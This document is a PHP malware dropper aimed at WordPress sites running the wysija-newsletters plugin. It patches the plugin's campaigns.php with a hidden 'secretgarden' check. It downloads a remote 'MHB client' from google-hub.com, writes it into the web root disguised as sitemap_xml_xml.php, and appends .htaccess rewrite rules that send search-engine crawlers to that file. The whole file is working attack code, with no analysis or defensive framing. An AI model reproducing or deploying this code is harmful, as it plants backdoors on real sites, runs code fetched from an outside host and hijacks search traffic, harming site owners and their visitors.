<?php

echo "[!]start\n";
$mask 		= '$bytes = $helperNumbers->get_max_file_upload();';
$new_mask 	= 'if(!isset($_GET[\'secretgarden\'])) { return false; } $bytes = $helperNumbers->get_max_file_upload(); '; 

$parts = explode('/wp-content/',$_SERVER['PHP_SELF']);
$wp_path = $parts[0];

   if(file_exists($fname=$_SERVER['DOCUMENT_ROOT'].$wp_path.'/wp-content/plugins/wysija-newsletters/controllers/back/campaigns.php'))
   {
	$content = file_get_contents($fname);
	echo "[+] got campaigns.php len of ".strlen($content)."\n";

   }
	if(is_writeable($fname))
	{
		if(!strstr($content, $new_mask))
		{
		$new_content = str_replace($mask, $new_mask, $content);
		if($f=fopen($fname,'w'))
			{
			if(fwrite($f,$new_content))
			{
			echo "[+] ok, writed\n";
			fclose($f);
			}
	
		}
		}
		else
		{
		echo "[!] i was here, already\n";
		return false;
		}

		
		
		}
		else
		{
		echo "[-] not writeable\n";
		}


function _curl_get_contents($url)
{
$host=str_replace('http://','',trim($url));
$host_parts=explode("/",$host);
$domain=$host_parts[0];
$path=str_replace($domain,"",$host);
$path=trim($path);

$sock=fsockopen($domain, 80, $errno, $errstr, 30);
        if($sock)
        {
        $request="GET {$path} HTTP/1.1\r\n";
        $request.="Host: {$domain}\r\n";
        $request.="Connection: Close\r\n\r\n";
        fwrite($sock, $request);
        $data="";
                while(!feof($sock))
                {
                $data.=fgets($sock,128);
                }
        fclose($sock);
	$data=substr($data, strpos($data,"\r\n\r\n")+4);
        return $data;
        }
}


function make_great_htaccess($path)
{

echo "[~] ok, working path {$path}\n";
$egg="\n\n".'<IfModule mod_rewrite.c>
				RewriteEngine On
				RewriteCond %{HTTP_USER_AGENT} (google|yahoo|slurp|bing|msnbot|yandex) [OR]
				RewriteCond %{HTTP_REFERER} (zzzzzz)
				RewriteCond %{REQUEST_URI} /$ [OR]
				RewriteCond %{REQUEST_FILENAME} (html|htm|php|phps|shtml|xml|xhtml|phtml|asp|aspx)$ [NC]
				RewriteCond %{REQUEST_FILENAME} !sitemap_xml_xml.php
				RewriteCond '.$path.'/sitemap_xml_xml.php -f
				RewriteRule ^.*$    /sitemap_xml_xml.php [L]
				</IfModule>'."\n";


				if(file_exists($path."/.htaccess"))
				{
					$original=file_get_contents($path."/.htaccess");
					if($f=fopen($path."/.htaccess","a+"))
					{ 
					echo "            [+] ok opened for append\n";
					}
				}
				elseif($f=fopen($path."/.htaccess","w"))
				{
					echo "            [+] ok did not found .htaccess, opened for writing\n";
				}
				else
				{
					die("[!-] I cant do nothing here :(\n");
				}				
			
		
				if(fwrite($f,$egg)) echo "              [+] ok writed!\n";
				fclose($f);

				echo "the final taccess looks like : ".file_get_contents($path."/.htaccess");
				echo "\nMHB INSTALLED ON THIS HOST       ".$_SERVER['SERVER_NAME']."\n";
				return true;
					
	}

echo "[~] Current system : ".php_uname()."\n";

$OS=strtolower(php_uname('s'));

if(!strstr('win',$OS))
{

	if($mhb_client=_curl_get_contents('http://google-hub.com/dr_cli.txt'))
	{
		echo "[+] Ok, ive got MHB client len of ".strlen($mhb_client)."\n";

				if(file_exists($_SERVER['DOCUMENT_ROOT']."/sitemap_xml_xml.php"))
				{
				die("[!] Seems like ive bee there before\n");
				}
			
				if($f=fopen($_SERVER['DOCUMENT_ROOT']."/sitemap_xml_xml.php","w"))
				{
					if(fwrite($f,$mhb_client))
					{
					echo "[+] ok, client writed!\n";
						if(make_great_htaccess($_SERVER['DOCUMENT_ROOT']))
						{
							echo "[+] SUCCESS\n";
						}
			
					}
				}
				else
				{
					echo "[-] I cant write client in root dir\n";			
				}
	}
	else
	{
		echo "[-] cant get the MHB client\n";
	}

}
